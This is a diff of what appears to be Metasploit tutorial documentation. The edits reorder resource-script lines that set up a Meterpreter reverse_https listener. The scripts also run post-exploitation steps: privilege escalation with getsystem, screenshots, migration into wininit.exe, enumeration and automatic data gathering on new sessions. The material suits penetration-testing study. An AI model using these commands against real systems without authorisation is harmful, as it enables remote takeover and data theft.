@@ -69,9 +69,9 @@
 
          echo 'use exploit/multi/handler' > handler.rc
          echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
+         echo 'set ExitOnSession false' >> handler.rc
          echo 'set LHOST 192.168.1.71' >> handler.rc
          echo 'set LPORT 666' >> handler.rc
-         echo 'set ExitOnSession false' >> handler.rc
          echo 'exploit' >> handler.rc
 
     `[run]` msfconsole -r /root/handler.rc
@@ -81,9 +81,9 @@
       kali > msfconsole
       msf > use exploit/multi/handler
       msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
+      msf exploit(multi/handler) > set ExitOnSession false
       msf exploit(multi/handler) > set LHOST 192.168.1.71
       msf exploit(multi/handler) > set LPORT 666
-      msf exploit(multi/handler) > set ExitOnSession false
       msf exploit(multi/handler) > exploit
 
       msf exploit(multi/handler) > makerc /root/handler.rc
@@ -107,7 +107,7 @@
 
         echo 'getprivs' > script.rc
         echo 'getsystem' >> script.rc
-        echo 'screenshot -v -p IClass.jpeg -v true' >> script.rc
+        echo 'screenshot' >> script.rc
         echo 'run migrate -n wininit.exe' >> script.rc
         echo 'run post/windows/gather/enum_applications' >> script.rc
         echo 'run post/multi/recon/local_exploit_suggester' >> script.rc
@@ -174,11 +174,11 @@
 
          echo 'setg resource /root/gather.rc' > handler.rc
          echo 'use exploit/multi/handler' >> handler.rc
+         echo 'set AutoRunScript post/multi/gather/multi_command' >> handler.rc
          echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
+         echo 'set ExitOnSession false' >> handler.rc
          echo 'set LHOST 192.168.1.71' >> handler.rc
          echo 'set LPORT 666' >> handler.rc
-         echo 'set ExitOnSession false' >> handler.rc
-         echo 'set AutoRunScript post/multi/gather/multi_command' >> handler.rc
          echo 'exploit' >> handler.rc
 
      `[run]` msfconsole > resource -r /root/handler.rc
